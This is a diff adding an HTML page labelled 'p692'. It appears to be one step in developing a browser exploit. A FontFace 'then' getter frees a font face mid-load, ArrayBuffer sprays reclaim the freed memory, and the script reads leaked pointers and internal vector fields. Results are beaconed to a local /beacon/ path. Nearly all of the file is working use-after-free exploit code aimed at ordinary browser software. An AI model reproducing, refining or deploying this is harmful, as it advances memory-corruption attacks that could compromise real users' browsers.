@@ -1,0 +1,143 @@
+<!--
+  p692: one measurement. After a stable p676b reclaim, set FontFace.unicodeRange
+  to 512 x U+0000-0000 (UnicodeRange is 8 bytes, 512 * 8 = 4096) and read
+  m_ranges at +0x20/+0x28/+0x2C. No second reclaim, no forged property chain.
+  One round only, so the round-1 destructor path is not entered.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p692</title></head>
+<body>p692: unicodeRange 512 and read +0x20
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P692-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'ranges20 n=512 one-round');
+flush();
+
+var round = 0;
+var gfired = -1;
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var round0Lane = null;
+
+function seedLane(dv, i) {
+  dv.setFloat32(0x44, 100 + i * 0.001, true);
+  if (i >= 5) dv.setUint8(0x82, 4);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function rangesOf(dv) {
+  var lo = dv.getUint32(0x20, true), hi = dv.getUint32(0x24, true);
+  return 'ptr=' + hex32(hi) + hex32(lo) +
+    ' cap=' + dv.getUint32(0x28, true) +
+    ' sz=' + dv.getUint32(0x2C, true);
+}
+
+function analyzeEarly() {
+  try {
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R0', 'MISS gf=' + gfired);
+      flush();
+      return;
+    }
+    var dv = spray[hit];
+    round0Lane = dv;
+    emit('R0', 'hit=' + hit +
+      ' T=' + hex32(dv.getUint32(0x5C, true)) + hex32(dv.getUint32(0x58, true)) +
+      ' W=' + hex32(dv.getUint32(0x6C, true)) + hex32(dv.getUint32(0x68, true)) +
+      ' rc=' + dv.getUint32(0x00, true) +
+      ' gf=' + gfired +
+      ' before ' + rangesOf(dv));
+    flush();
+    var parts = [];
+    for (var i = 0; i < 512; i++) parts.push('U+0000-0000');
+    try {
+      ff.unicodeRange = parts.join(', ');
+      emit('SET', 'ok len=' + ff.unicodeRange.length);
+    } catch (e) {
+      emit('SET', 'threw ' + String(e).slice(0, 100));
+    }
+    flush();
+    emit('AFTER', 'hit=' + hit + ' ' + rangesOf(dv));
+    flush();
+  } catch (e) {
+    emit('R0-FATAL', String(e).slice(0, 150));
+    flush();
+  }
+}
+
+function analyzeLate() {
+  try {
+    if (!round0Lane) { emit('LATE', 'no-hit'); flush(); return; }
+    emit('LATE', rangesOf(round0Lane) + ' rc=' + round0Lane.getUint32(0x00, true));
+    emit('ALIVE', 'end-r0-ranges20');
+    flush();
+  } catch (e) {
+    emit('LATE-FATAL', String(e).slice(0, 150));
+    flush();
+  }
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = [ff];
+  armed = true;
+  document.fonts.load('1em f0, s0', 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+setTimeout(beginRound, 50);
+})();
+</script>
+</body></html>
